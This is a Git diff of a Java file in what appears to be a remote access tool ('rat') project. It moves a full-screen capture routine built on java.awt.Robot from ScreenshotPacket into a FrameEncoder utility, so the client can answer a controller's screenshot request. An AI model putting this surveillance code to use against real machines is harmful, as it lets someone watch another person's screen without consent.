@@ -1,16 +1,12 @@
 package de.sogomn.rat.packet;
 
-import java.awt.AWTException;
-import java.awt.Dimension;
-import java.awt.Rectangle;
-import java.awt.Robot;
-import java.awt.Toolkit;
 import java.awt.image.BufferedImage;
 
 import de.sogomn.engine.Screen;
 import de.sogomn.engine.Screen.ResizeBehavior;
 import de.sogomn.engine.util.ImageUtils;
 import de.sogomn.rat.ActiveClient;
+import de.sogomn.rat.util.FrameEncoder;
 
 public final class ScreenshotPacket extends AbstractPingPongPacket {
 	
@@ -60,7 +56,7 @@ public final class ScreenshotPacket extends AbstractPingPongPacket {
 	@Override
 	protected void executeRequest(final ActiveClient client) {
 		type = DATA;
-		image = takeScreenshot();
+		image = FrameEncoder.takeScreenshot();
 		
 		if (image == null) {
 			image = NO_IMAGE;
@@ -87,22 +83,6 @@ public final class ScreenshotPacket extends AbstractPingPongPacket {
 	
 	public BufferedImage getImage() {
 		return image;
-	}
-	
-	public static BufferedImage takeScreenshot() {
-		final Dimension screen = Toolkit.getDefaultToolkit().getScreenSize();
-		final Rectangle screenRect = new Rectangle(screen);
-		
-		try {
-			final Robot robot = new Robot();
-			final BufferedImage image = robot.createScreenCapture(screenRect);
-			
-			return image;
-		} catch (final AWTException ex) {
-			ex.printStackTrace();
-			
-			return null;
-		}
 	}
 	
 }
